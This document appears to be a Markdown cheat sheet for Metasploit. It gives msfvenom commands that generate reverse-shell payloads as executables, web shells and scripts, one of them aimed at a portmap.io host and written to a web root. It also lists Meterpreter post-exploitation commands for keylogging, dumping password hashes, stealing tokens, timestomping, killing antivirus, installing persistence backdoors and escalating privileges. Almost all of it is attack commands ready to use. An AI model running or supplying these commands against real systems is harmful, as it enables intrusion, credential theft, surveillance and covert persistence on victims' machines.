# Meterpreter-msfvenom
## 1.Msfvenom - generating shellcode
### Binaries
Linux:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

OR

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf

```
Windows:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

OR

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe

E.g 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=7229 -a x86 -f exe > /var/www/html/Shell.exe

OR

msfvenom -p windows/meterpreter/reverse_tcp -e x86/Hackeraj_Virus_Alert -i 5 -b '\x00' LHOST=Hackeraj-59554.portmap.io LPORT=59554 -f exe > /root/Desktop/Shell.exe
```
Mac:
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
OR
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```
### Web Payloads

PHP:
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
ASP:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```
JSP:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```
WAR:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```
### Script Payload
Python:
```
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```
Bash:
```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```
Perl:
```
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```
## 2.Meterpreter
Process:
```
getuid              hows user id
getpid              shows meterpreter process id
ps              ists running processes
migrate [ps]            migrates to given process (one that wont end/crash)
```
KeyLog: Ensure you are monitoring the correct session (Explorer.exe/WinLogin.exe)
```
idletime            shows how long machine has been idle for
keyscan_start           starts the key logger
keyscan_dump            outputs captured data
keyscan_stop            stops the keylogger
```
Channels: This allows you to do more than one thing at a time in meterpreter
```
execute -f cmd.exe -c       opens a new cmd.exe and creates a new channel for it
channel -l          lists the open channels
read [channel]          outputs data from channel
interact [channel]      allows you to jump into the channel
write [channel]         sends data to the channel
close [channel]         kills the channel
```
Session: Session0 is the local desktop. Session1+ are rdp sessions.
```
enumdesktops            shows currently open desktops such as winlogin etc
getdesktop          shows current desktop session meterpreter is in
setdesktop          changes to an already open desktop session
uictl disable keyboard      disables the keyboard of the desktop session
```
FileEdit: Ability to edit files atributes such as MACE
```
timestomp file.txt -c "30/12/1980 12:12:34" changes file stamp of file
timestomp file.txt -f sourcefile.txt        copys timestamp from sourcefile.txt
use priv            to load the priv extras
hashdump            to dump the SAM file :-)
```
Tokens: Incognito allows token stealing and other token functions
```
use incognito           loads the incognito into meterpreter
list_tokens -u          shows stealable tokens
impersonate_token       allows a token to be stolen
steal_token [psid]      allows ability to steal token of a process
rev2self            reverts to origional token
run post/windows/gather/cachedump   gets cached domain hashes
need to wget http://lab.mediaservice.net/code/cachedump.rb to framework3/modules/post/windows/gather
```
Sniffer: Allows promiscuos mode to be enabled ;-)
```
use sniffer         loads the sniffer functions
sniffer_interfaces      list interface 1,2,3,4,5,6,etc
sniffer_start [n]       starts the sniffer for the interface
sniffer_stats [n]       lists packets, time, etc..
sniffer_dump [n] file.pcap  dumps the capture locally
sniffer_stop            you guessed it ;-)
```
Meterpreter Scripts: These scripts perform various functions on the victim
```
run checkvm         checks if the target is a vm
run credscollect        dumps hashes and tokens to screen
run enum_firefox        dumps temp internet files from firefox - cookies, passwords, etc :-)
run get_application_list    shows installed applications
run killav          trys to stop all known AV progs
run get_local_subnets       enumerates local subnet info
run metsvc          creates a backdoor
run persistence         survices a reboot (without admin or system)
run schedulme -e file.exe -m 30 you'll need to man load the meterpreter.exe payload
run kitrap0d            allows priv escalation using CVE-2010-0232
```

